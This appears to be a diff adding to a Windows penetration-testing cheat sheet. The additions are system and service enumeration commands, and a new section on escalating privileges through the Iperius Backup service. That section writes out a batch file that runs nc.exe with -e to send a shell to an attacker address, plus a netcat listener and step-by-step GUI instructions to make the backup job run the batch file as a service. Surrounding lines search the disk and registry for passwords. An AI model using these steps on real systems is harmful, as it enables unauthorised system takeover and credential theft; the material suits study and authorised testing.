@@ -14,6 +14,7 @@ render_with_liquid: false
 hostname
 # System information
 systeminfo
+systeminfo | findstr "OS"
 # Version
 ver
 
@@ -58,6 +59,10 @@ findstr /spin "password" *.*
 dir /s *pass* == *cred* == *vnc* == *.config*
 reg query HKLM /f password /t REG_SZ /s
 
+# Get services running
+wmic service list
+wmic service list | findstr "Backup"
+wmic service list | findstr "Iperius"  # Iperius is a backup service
 # Get target process info
 wmic process get processid,parentprocessid,executablepath | find "<process-id>"
 # Get users SID
@@ -73,6 +78,20 @@ cd \'$Recycle.bin\S-1-5-21-198...334-1001'
 vssadmin
 vssadmin list shadows
 vssadmin list volumes
+
+# Get contents of file
+more .\example.txt
+type .\example.txt
+
+# Edit file
+notepad .\example.txt
+edit .\example.txt
+nano .\example.txt
+vim .\example.txt
+vi .\example.txt
+
+# Move file
+move .\example.txt ..\Desktop\
 ```
 
 <br />
@@ -159,3 +178,52 @@ strings64.exe example.exe | findstr "sometext"
 <br />
 
 ## Task Scheduler
+
+<br />
+
+## Iperius Backup Service (Privilege Escalation)
+
+Iperius is vulnerable to privilege escalation.
+
+```sh
+# On target windows machine
+
+# Check if Iperius is running
+wmic service list | findstr "Iperius"
+
+# Create a .bat file (ex. "exploit.bat") and place it to Desktop.
+# When saving, be sure to save it as the file type "All Files". (NOT Text Documents (*.txt))
+@echo off
+C:\Users\<USERNAME>\Downloads\nc.exe <attack_machine_ip> 1337 -e exploit.exe
+
+
+# ----------------------------------------------------------
+
+# On attack machine
+
+# Open listener...
+nc -lvnp 1337
+
+# ----------------------------------------------------------
+
+# On target windows machine
+
+# Settings
+1. Click "Iperius" icon in Windows Explorer (path: C:\Program Files (x86)\Iperius Backup\Iperius).
+2. Right click the "Iperius" icon on the right-bottom of the bar to open it.
+3. Click "Create New Backup" and select "Add Folder".
+4. Enter path (c:\Users\<USERNAME>\Documents) and click "OK".
+5. Navigate to "Destination" tab and select "Add Destination Folder".
+7. Enter path (c:\Users\<USERNAME>\Descktop) and click "OK".
+8. Navigate to "Other Processes" tab.
+9. On "Before backup" section, check "Run a program or open external file:" and select "exploit.bat" file.
+
+# Run 
+On "Iperius Backup" window, right-click on backup jobs "Documents" and select "Run backup as service" then click "OK" on the dialog.
+
+
+# -----------------------------------------------------
+
+# On attack machine
+Now you should see an incoming connection.
+```
